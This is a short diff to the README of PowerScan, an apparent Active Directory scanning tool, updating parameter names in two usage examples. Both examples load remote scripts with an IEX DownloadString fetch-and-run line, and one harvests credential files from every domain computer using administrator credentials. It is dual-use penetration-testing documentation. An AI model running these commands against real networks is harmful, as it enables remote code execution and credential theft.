@@ -82,7 +82,7 @@ Get the status of Print Spooler service on all domain controllers (using implici
 ```
 PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/PowerScan.ps1')
 PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/Recon/Get-SpoolerStatus.ps1')
-PS C:\> Invoke-PowerScan -ScriptBlock ${Function:Get-SpoolerStatus} -DomainControllers ADATUM.CORP -NoCsv
+PS C:\> Invoke-PowerScan -ScriptBlock ${Function:Get-SpoolerStatus} -ComputerDomain ADATUM.CORP -ComputerFilter DomainControllers -NoCsv
 ```
 
 
@@ -92,7 +92,7 @@ Gather credentials from common files on all domain computers (using explicit cre
 PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/PowerScan.ps1')
 PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/Hunt/Get-CredentialFile.ps1')
 PS C:\> $cred = Get-Credential Administrator@ADATUM.CORP
-PS C:\> Invoke-PowerScan -ScriptBlock ${Function:Get-CredentialFile} -ScriptParameters @{'Credential'=$cred; 'Download'=$true} -DomainComputers ADATUM.CORP -Credential $cred
+PS C:\> Invoke-PowerScan -ScriptBlock ${Function:Get-CredentialFile} -ScriptParameters @{Credential=$cred; Download=$true} -ComputerDomain ADATUM.CORP -Credential $cred
 ```
 
 
